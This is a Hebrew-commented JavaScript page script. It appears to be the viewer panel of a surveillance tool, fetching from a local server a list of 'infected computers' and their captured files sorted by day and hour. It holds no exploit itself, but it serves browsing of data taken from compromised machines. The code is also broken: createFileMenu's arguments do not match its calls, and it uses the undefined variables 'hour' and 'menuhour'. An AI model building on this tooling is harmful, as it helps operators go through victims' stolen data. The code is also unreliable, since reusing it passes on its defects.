// פונקציה לעדכון השעון
function updateClock() {
    const clock = document.getElementById("clock");
    const now = new Date();
    const hours = now.getHours().toString().padStart(2, "0");
    const minutes = now.getMinutes().toString().padStart(2, "0");
    const seconds = now.getSeconds().toString().padStart(2, "0");
    clock.textContent = `${hours}:${minutes}:${seconds}`;
}

// התחלת שעון עם עדכון כל שניה
function startClock() {
    updateClock();
    setInterval(updateClock, 1000);
}

// פונקציות עזר להצגת והסתרת אלמנטים
function hideElements(elements) {
    elements.forEach(element => element.style.display = 'none');
}

function showElements(elements) {
    elements.forEach(element => element.style.display = 'block');
}

// פונקציה להצגת הודעה עם אפקט הקלדה
async function showMessage(message, container) {
    return new Promise(resolve => {
        typeMessageEffect(message, container);
        setTimeout(resolve, message.length * 50);
    });
}

// פונקציה לעיכוב
function wait(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}


async function fetchMachines(container) {
    try {
        await showMessage("מתחבר לשרת לקבלת נתונים...", container);

        const response = await fetch('http://127.0.0.1:5000/get_machines');
        const data = await response.json();
        await wait(1000);
        await showMessage("החיבור לשרת הושלם בהצלחה.", container);

        if (data && data.machines.length > 0) {
        await wait(1000);
        await showMessage("נמצאו מחשבים נגעוים, מייד מציג את הנתונים.", container);
            createMachinesMenu(container, data.machines);
            await showMessage("בחר מחשב מהרשימה:", container);
        } else {
            await wait(2000);
            await showMessage("לא נמצאו מחשבים.", container);
        }
    } catch (error) {
        console.error("שגיאה בעת שליפת רשימת מחשבים:", error);
        await wait(2000);
        await showMessage("אירעה שגיאה בעת שליפת רשימת מחשבים.", container);
    }
}

function createMachinesMenu(container, machines) {
    const menuMachines = document.createElement("div");
    menuMachines.classList.add("menu-erea", "menu-machines");

    machines.forEach(machine => {
        const button = document.createElement("button");
        button.textContent = machine;
        button.classList.add("menu-button");

        button.onclick = () => fetchDay(container, machine);

        menuMachines.appendChild(button);
    });

    container.appendChild(menuMachines);
}

async function fetchDay(container, machineName) {
    await showMessage(`המחשב "${machineName}" נבחר. מבצע חיפוש נתונים...`, container);

    try {
        const response = await fetch(`http://127.0.0.1:5000/get_day_list/${machineName}`);
        const data = await response.json();


        if (data && data.days.length > 0) {
            await showMessage(`נתונים עבור המחשב "${machineName}" נמצאו. מציג את הנתונים כעת...`, container);
            createDayMenu(container, machineName, data.days); // יוצרים תפריט בחירה לנתונים
            await showMessage("בחר יום להצגת נתונים או הקש F להצגת כל הנתונים", container);

        } else {
            await wait(4000);
            await showMessage(`לא נמצאו נתונים עבור המחשב "${machineName}".`, container);
        }
    } catch (error) {
        console.error("שגיאה בעת שליפת נתוני המחשב:", error);
        await wait(4000);
        await showMessage("אירעה תקלה בעת ההתחברות לשרת. אנא נסה שוב מאוחר יותר.", container);
    }
}

function createDayMenu(container, machineName, days) {
    const menuFiles = document.createElement("div");
    menuFiles.classList.add("menu-erea", "menu-day");

    days.forEach(day => {
        const button = document.createElement("button");
        button.textContent = day;
        button.classList.add("menu-button");

        button.onclick = () => fetchHour(container, machineName, day);

        menuFiles.appendChild(button);
    });

    container.appendChild(menuFiles);
}
async function fetchHour(container, machineName, selectedDay) {
    await showMessage(`מבצע שליפת נתונים עבור "${machineName}" ביום "${selectedDay}"...`, container);

    try {
        const response = await fetch(`http://127.0.0.1:5000/get_hour_list/${machineName}/${selectedDay}`);
        const data = await response.json();

        console.log("שעות שהתקבלו מהשרת:", data.hours); // בדיקה

        if (data && data.hours.length > 0) {
            await wait(1000);
            await showMessage(`נתונים עבור המחשב "${machineName}" נמצאו. מציג את הנתונים כעת...`, container);
            createHourMenu(container, machineName,selectedDay, data.hours); 
        } else {
            await wait(4000);
            await showMessage(`לא נמצאו נתונים עבור המחשב "${machineName}".`, container);
        }
    } catch (error) {
        console.error("שגיאה בעת שליפת נתונים:", error);
        await showMessage("אירעה תקלה בעת השליפה. אנא נסה שוב מאוחר יותר.", container);
    }
}


function createHourMenu(container, machineName, selectedDay, hours) {
    // ניקוי תפריט קודם אם קיים
    const existingMenu = document.querySelector('.menu-hour');
    if (existingMenu) {
        existingMenu.remove();
    }

    const menuhour = document.createElement("div");
    menuhour.classList.add("menu-erea", "menu-hour");

    hours.forEach(hour => {
        const button = document.createElement("button");
        button.textContent = hour;
        button.classList.add("menu-button");

        button.onclick = () =>  fetchFile(container, machineName, selectedDay, hour);

        menuhour.appendChild(button);
    });

    console.log("מוסיף תפריט שעות:", menuhour); // בדיקה
    container.appendChild(menuhour);
}


async function fetchFile(container, machineName, selectedDay, selecteHour) {

    try {
        const response = await fetch(`http://127.0.0.1:5000/get_file_list/${machineName}/${selectedDay}/${selecteHour}`);
        const data = await response.json();

        console.log("שעות שהתקבלו מהשרת:", data.files); // בדיקה

        if (data && data.files.length > 0) {
            createFileMenu(container, machineName, data.files); 
        } else {
            await wait(4000);
            await showMessage(`לא נמצאו נתונים עבור המחשב "${machineName}".`, container);
        }
    } catch (error) {
        console.error("שגיאה בעת שליפת נתונים:", error);
        await showMessage("אירעה תקלה בעת השליפה. אנא נסה שוב מאוחר יותר.", container);
    }
}


function createFileMenu(container, files) {
    // ניקוי תפריט קודם אם קיים
    const existingMenu = document.querySelector('.menu-file');
    if (existingMenu) {
        existingMenu.remove();
    }

    const menuFiles = document.createElement("div");
    menuFiles.classList.add("menu-erea", "menu-hour");

    files.forEach(file => {
        const button = document.createElement("button");
        button.textContent = file;
        button.classList.add("menu-button");

        button.onclick = () => showMessage(`נבחרה שעה: ${hour}`, container);

        menuFiles.appendChild(button);
    });

    console.log("מוסיף תפריט שעות:", menuhour); // בדיקה
    container.appendChild(menuhour);
}


// אפקט הקלדה להודעות
function typeMessageEffect(message, container) {
    const messageElement = document.createElement('p');
    messageElement.classList.add('message');
    container.appendChild(messageElement);

    let i = 0;
    function typeCharacter() {
        if (i < message.length) {
            messageElement.textContent = message.slice(0, i + 1);
            i++;
            setTimeout(typeCharacter, 50);
        }
    }
    typeCharacter();
}

// אתחול הדף בעת טעינה
document.addEventListener('DOMContentLoaded', async function() {
    const backgroundVideo = document.getElementById('background-video');
    const loginMessage = document.querySelector('.login-message');
    const username = localStorage.getItem('username');
    const usernameDiv = document.getElementById('username');
    usernameDiv.textContent = `🔒${username}`;
    const clock = document.getElementById('clock');
    const messageContainer = document.getElementById('message-container');
    const menuFiles = document.getElementById('menu-files');
    const menuComputers = document.getElementById('menu-computers');

    startClock();

    hideElements([usernameDiv, clock, messageContainer]);
    await showElements([loginMessage]);

    await wait(3000);

    showElements([backgroundVideo, clock, usernameDiv, messageContainer]);
    hideElements([loginMessage]);

    await showMessage(`ברוך הבא ${username}!`, messageContainer);
    await wait(2000);
    await fetchMachines(messageContainer);
});
